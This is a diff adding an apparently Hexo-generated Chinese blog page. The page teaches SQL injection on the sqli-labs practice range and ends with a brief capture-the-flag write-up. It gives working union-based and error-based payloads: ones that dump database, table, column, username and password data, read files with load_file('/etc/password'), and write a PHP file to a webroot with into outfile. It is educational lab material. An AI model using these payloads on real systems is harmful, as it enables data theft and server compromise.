@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="sql注入的原理分析SQL注入漏洞(SQL injection)是Web层面最高危的漏洞之一。在2008年至2010年期间，SQL注入漏洞连续3年在OWASP年度十大漏洞排行中排名第一。 在2005年前后，SQL注入漏洞注入漏洞到处可见，在用户登录或者搜索时，只需输入一个单引号就可以检测出这种漏洞。随着WEB应用程序的安全性不断提高，SQL注入漏洞逐渐减少，同时也变得更加难以检测与利用。 SQLI">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://yoursite.com/blog1/新文档1.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="sql注入的原理分析SQL注入漏洞(SQL injection)是Web层面最高危的漏洞之一。在2008年至2010年期间，SQL注入漏洞连续3年在OWASP年度十大漏洞排行中排名第一。 在2005年前后，SQL注入漏洞注入漏洞到处可见，在用户登录或者搜索时，只需输入一个单引号就可以检测出这种漏洞。随着WEB应用程序的安全性不断提高，SQL注入漏洞逐渐减少，同时也变得更加难以检测与利用。 SQLI">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://www.zkaq.org/upload/md/2f1464abbc462c501dc28dee8f7356aa_83478.png">
+<meta property="og:updated_time" content="2019-10-14T03:45:10.335Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Hexo">
+<meta name="twitter:description" content="sql注入的原理分析SQL注入漏洞(SQL injection)是Web层面最高危的漏洞之一。在2008年至2010年期间，SQL注入漏洞连续3年在OWASP年度十大漏洞排行中排名第一。 在2005年前后，SQL注入漏洞注入漏洞到处可见，在用户登录或者搜索时，只需输入一个单引号就可以检测出这种漏洞。随着WEB应用程序的安全性不断提高，SQL注入漏洞逐渐减少，同时也变得更加难以检测与利用。 SQLI">
+<meta name="twitter:image" content="https://www.zkaq.org/upload/md/2f1464abbc462c501dc28dee8f7356aa_83478.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="page-" class="article article-type-page" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/blog1/新文档1.html" class="article-date">
+  <time datetime="2019-10-14T03:45:10.335Z" itemprop="datePublished">2019-10-14</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="sql注入的原理分析"><a href="#sql注入的原理分析" class="headerlink" title="sql注入的原理分析"></a>sql注入的原理分析</h1><p>SQL注入漏洞(SQL injection)是Web层面最高危的漏洞之一。在2008年至2010年期间，SQL注入漏洞连续3年在OWASP年度十大漏洞排行中排名第一。</p>
+<p>在2005年前后，SQL注入漏洞注入漏洞到处可见，在用户登录或者搜索时，只需输入一个单引号就可以检测出这种漏洞。随着WEB应用程序的安全性不断提高，SQL注入漏洞逐渐减少，同时也变得更加难以检测与利用。</p>
+<p>SQLI，sql injection，我们称之为 sql 注入。何为 sql，英文：Structured Query Language，叫做结构化查询语言。常见的结构化数据库有 MySQL，MS SQL ,Oracle 以及 Postgresql。Sql语言就是我们在管理数据库时用到的一种。在我们的应用系统使用 sql 语句进行管理应用数据库时，往往采用拼接的方式形成一条完整的数据库语言，而危险是，在拼接 sql 语句的时候，我们可以改变 sql 语句。从而让数据执行我们想要执行的语句，这就是我们常说的 sql注入。<br>PS：我这里sql注入系列以sqli-libs为靶场。<br>sql注入漏洞分类</p>
+<p>在测试注入漏洞之前，首先要弄个清楚一个概念：注入的分类。明白了分类之后，在测试注入将起到事半功倍的效果。</p>
+<p>我在这里将常见的SQL注入分为两种：数字型和字符型。也有人把类型分得更多，更细。但不管注入类型如何，攻击者的目的只有一点，那就是绕过程序限制，使用用户输入的数据代入数据库执行，利用数据库的特性获取更多信息或者更大权限。<br>数字型注入</p>
+<p>当输入的参数为整型时，如：ID、年龄、页码等，如果存在注入漏洞，则可以认为是数字型注入，数字型注入是最简单的一种，假设有URL为<br><a href="HTTP://www.xxser.com/test.php?id=8,可以猜测sql语句为：" target="_blank" rel="noopener">HTTP://www.xxser.com/test.php?id=8,可以猜测sql语句为：</a><br>select * from table where id=8<br>测试步骤如下：<br>1、HTTP://<a href="http://www.xxser.com/test.php?id=8&#39;" target="_blank" rel="noopener">www.xxser.com/test.php?id=8&#39;</a><br>SQL语句为：select * from table where id=8’ 这样的语句肯定会出错，导致脚本程序无法从数据库中正常获取数据，从而使原来页面出现异常。<br>2、HTTP://<a href="http://www.xxser.com/test.php?id=8" target="_blank" rel="noopener">www.xxser.com/test.php?id=8</a> and 1=1<br>SQL语句为select * from table where id=8 and 1=1 语句执行正常返回数据与原始请求无任何差异。<br>3、HTTP://<a href="http://www.xxser.com/test.php?id=8" target="_blank" rel="noopener">www.xxser.com/test.php?id=8</a> and 1=2<br>SQL语句变为select * from table where id=8 and 1=2<br>语句执行正常。但却无法查询数据，因为“and 1=2”始终为假。所以返回数据与原始数据请求有差异。<br>这种数字型注入最多是出现在PHP、ASP等 弱类型语言中，弱类型语言会自动推导变量类型，例如，参数id=8，PHP会自动推导变量id的数据类型为int类型，那么id=8 and 1=1 则会推导为string类型，这是弱类型语言得特性。而对于Java、C这类型的强类型语言，如果试图把一个字符串转为int类型，则会抛出异常，无法继续执行。所以，强类型语言很少存在数字型注入漏洞，强类型语言在这方面比弱类型语言有优势。<br>字符型注入</p>
+<p>当输入参数为字符串使，称为字符型。数字型与字符型注入最大的区别在不需要单引号闭合，而字符串类型一般要使用单引号来闭合。<br>例如： select * from table where username=’admin’<br>字符型注入最关键的是如何闭合SQL语句以及注释多余的代码。<br>当查询内容为字符串时，sql代码如下：<br>select * from table wehre username=’admin’<br>当攻击者进行sql注入时，如果输入”admin adn 1=1”，则无法进行注入。因为”admin and 1=1”会被数据库当做查询的字符串，SQL语句如下：<br>select * from table where username=’admin and 1=1’<br>这时想要进行注入，则必须注意字符串闭合的问题。如果输入”admin’ and 1=1 –”就可以继续注入，SQL语句如下：<br>select * from table where username = ‘admin’ and 1=1 –’<br>只要是字符串类型注入，都必须闭合单引号以及注释多余的代码。例如，update语句：<br>update person set username=’username’,set password=’’+(select @@version)+’’where id=1<br>利用两次单引号闭合完成sql注入。<br>注：数据库不同，字符串连接符不同，如SQL Server连接符号为“+”，Oracle连接符为“||”，Mysql连接符为空格。<br>例如Insert语句：<br>Insert into users(username,password,title) values(‘username’,’password’,’title’)<br>当注入title字段时，可以像update注入一样，直接使用以下SQL语句：<br>Insert into users(username,password,title) values(‘username’,’password’,’’+(select @@version)+’’)<br>这里把SQL注入只分为数字型和字符型，但是很多人会不会问不是还有Cookie注入，POST注入、盲注、延时注入，其实这些都是以上两大类额不同展示形式，后者不同的展现位置罢了。<br>这里把SQL注入分为数字型和字符型是因为数据库进行数据查询时，输入数据一般只有两种方式：一个是数字型，比如where id=1、where age&gt;20，另一个是字符串类型，比如where name=’root’、where datetime&gt;’2013-08-18’。可能不同的数据库比较方式不一样，但带入数据库查询时一定是字符串，所以，无论是POST注入、还是其他类型注入，都可归纳为数字型注入或者字符型注入。<br>严格的说，数字也是字符串，在数据库找那个进行查询时，where id=’1’也是合法的，只不过在查询条件为数字时一般不会加单引号。<br>以下是一些常见的注入叫法：<br>POST注入：注入字段在POST数据中；<br>Cookie注入：注入字段在Cookie数据中；<br>延时注入：使用数据库延时特性注入；<br>搜索注入：注入处为搜索地点；<br>base64注入：注入字符需要经过base64加密；<br>Mysql显错注入<br>MySQL自带信息库</p>
+<p>Mysql5.0以上的版本提供了INFORMATION_SCHEMA库，这是mysql自带的一个信息数据库，它提供了访问数据库元数据的方式。<br>information_schema库下存放着数据库对象相关概要信息，比如字符集、引擎、数据库、数据表、视图、列、权限等，其中有重要的三个表，分别是：</p>
+<p>(1) schemata表，存放着MySQL数据库下所有库的信息，show databases命令的结果就是来自于这个表。此表有五列，分别是：catalog_name、schema_name、default_character_set_name、default_collation_name、sql_path，其中schema_name列存储的就是MySQL数据库下所有库的名字（爆数据库名用到此表）；</p>
+<p>(2) tables表，此表提供了关于数据库中的表的信息（包括视图），重要的两个列，一是table_schema：表所属数据库的名字，二是 table_name：表的名字（爆表名就要用到此表）。</p>
+<p>(3) columns表，此表提供了表中列的信息，详细表述了某张表的所有列以及每个列的信息，重要的三个列，一是table_schema：字段所属数据库的名字，二是table_name：字段所属数据表的名字，三是column_name：字段的名字（用此表爆字段名）。</p>
+<p>SQL注入常用函数<br>order by<br>union查询</p>
+<p>union关键字将两个或者更多个查询结果组合为单个结果集，俗称联合查询，大部分数据库都支持UNION查询，如Mysql、SQL Server、Oracle、DB2等。下面列出使用union合并两个查询结果集的基本规则。<br>1、所有查询中的列数必须相同<br>2、数据类型必须兼容。</p>
+<p>当查询中的列数不相同时<br>查询系统信息函数<br>version()</p>
+<p>返回mysql版本<br>user()</p>
+<p>查看当前使用的数据库的用户<br>database()</p>
+<p>查看当前使用的数据库<br>@@datadir</p>
+<p>列出数据库的绝对路径<br>@@version_compile_os</p>
+<p>获取当前操作系统版本信息<br>load_file()</p>
+<p>使用MySQL读取磁盘文件是非常简单的，MySQL提供了load_file函数，可以帮助用户快速的读取文件，但文件的位置必须在服务器上，文件必须全为路径名称(绝对路径)，而且用户必须持有FILE权限，文件容量也必须小于max_allowed_packet字节(默认16MB，最大1GB)<br>SQL语句如下：<br>union select 1,load_file(‘/etc/password’),3,4,5,6 #<br>通常，一些防注入语句不允许出现单引号，可以转换成十六进制<br>“etc/password”的十六进制转换结果为“0x2f6574632f70617373776f7264”，那么就可以使用以下语句绕过：<br>union select 1,load_file(0x2f6574632f70617373776f7264),3,4,5,6 #<br>也可使用char()函数将ascii转换为字符串。<br>union select 1,load_file(char(47,101,116,99,47,112,97,115,115,119,100))，3,4,5,6 #<br>也可使用hex()函数转换为十六进制。<br>select hex(load_file(char(47,101,116,99,47,112,97,115,115,119,100)));<br>into outfile()</p>
+<p>MySQL提供了向磁盘写入文件的操作，与load_file()一样，必须持有FILE权限，并且文件必须为全路径名称。<br>写入文件:<br>select ‘‘ into outfile ‘c:\wwwroot\1.php’<br>select char(99,58,92,50,46,116,120,116) into outfile ‘c:\wwwroot\1.php’<br>concat()</p>
+<p>连接字符串函数，在MySQL查询中，如果需要一次查询多个数据，可以使用concat()或concat_ws()函数来完成。<br>1、caoncat()函数<br>select name from student where id=1 union select concat(user(),’—–’,database(),’—–’,version());<br>concat_ws()</p>
+<p>如果觉得caocat(user(),0xzc,database(),0x2c,version())比较麻烦，可以使用caoncat_ws()它比concat()函数更简洁。如：<br>select name from student where id=1 union select caoncat_ws(0x2c,user(),database(),version());<br>0x2c是十六进制的逗号。<br>updatexml()</p>
+<p>union select updatexml(1,(concat(0x7c,(select @@datadir))),1)–+<br>extractvalue()</p>
+<p>union select extractvalue(1,concat(0x7c,(select user())))–+</p>
+<h2 id="mysql显错注入基本流程"><a href="#mysql显错注入基本流程" class="headerlink" title="mysql显错注入基本流程"></a>mysql显错注入基本流程</h2><p>$sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”;</p>
+<p>为了方便理解这里把源码贴进来，可以看到这里使用的单引号，对单引号进行过滤。</p>
+<p><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;</a> and 1=1–+</p>
+<p>成功绕过，and 1=1并没有报错。证明and 1=1被带入执行。<br>接下来查询这张表有个字段,经过测试，查出3个字段。</p>
+<p><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;order" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;order</a> by 3–+</p>
+<p>使用联合查询，判断回显点。</p>
+<p><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;and</a> 1=2 union select 1,2,3 –+</p>
+<p>2,3的位置有回显。<br>注意：使用union联合查询函数，必须使union前面的表达式为假，后面的注入语句才可以执行，这里使用 and 1=2永为假<br>然后使用group_concat、concat()、或者concat_ws()等字符串连接函数,查询当前数据库用户，mysql版本、当前使用的数据库。</p>
+<p><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;and</a> 1=2 union select 1,concat(user(),’—‘,version(),’—‘,database()),3–+</p>
+<p>当前数据库已经知道了，查一下这台服务器上的所有数据库。</p>
+<p><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;</a> and 1=2 union select 1,2,group_concat(schema_name) from information_schema.schemata–+</p>
+<p>然后查security库的所有表。</p>
+<p><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;</a> and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=’security’–+</p>
+<p>接着查敏感表users表中有哪些字段。</p>
+<p><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;</a> and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=’users’–+</p>
+<p>最后查username和password字段的内容。</p>
+<p><a href="http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sqli-labs/Less-1/?id=1&#39;</a> and 1=2 union select 1,group_concat(username),group_concat(password) from security.users–+</p>
+<h1 id="rank——1："><a href="#rank——1：" class="headerlink" title="rank——1："></a>rank——1：</h1><p>打开靶场，根据提示，在url栏中加入id=1<br>可知，用’可以闭合语句</p>
+<p>测试注入点：</p>
+<p><img src="https://www.zkaq.org/upload/md/2f1464abbc462c501dc28dee8f7356aa_83478.png" alt><br>存在注入<br>猜字段：order by</p>
+<p>得出3个字段<br>查库名：</p>
+<p>查表：</p>
+<p>得出：</p>
+<p>在zkaq表中查zkaq</p>
+<p>得出了flag：zKaQ-ErR0rBaS4d</p>
+<h1 id="rank-2："><a href="#rank-2：" class="headerlink" title="rank-2："></a>rank-2：</h1><p>Your sql statement is SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1<br>根据语句，无闭合</p>
+<h1 id="rank-3："><a href="#rank-3：" class="headerlink" title="rank-3："></a>rank-3：</h1><p>Your sql statement is SELECT * FROM users WHERE id=(‘1’) LIMIT 0,1<br>根据语句，用’)闭合</p>
+<h1 id="rank-4："><a href="#rank-4：" class="headerlink" title="rank-4："></a>rank-4：</h1><p>Your sql statement is SELECT * FROM users WHERE id=(“1”) LIMIT 0,1<br>根据语句，用”)闭合</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/blog1/新文档1.html" data-id="ck1z1u11n000xycv05inig2os" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/10/20/csrf/">csrf</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/dom型xss/">dom型xss</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/存储型xss/">存储型xss</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/反射性xss/">反射性xss</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/20/dns注入/">dns注入</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
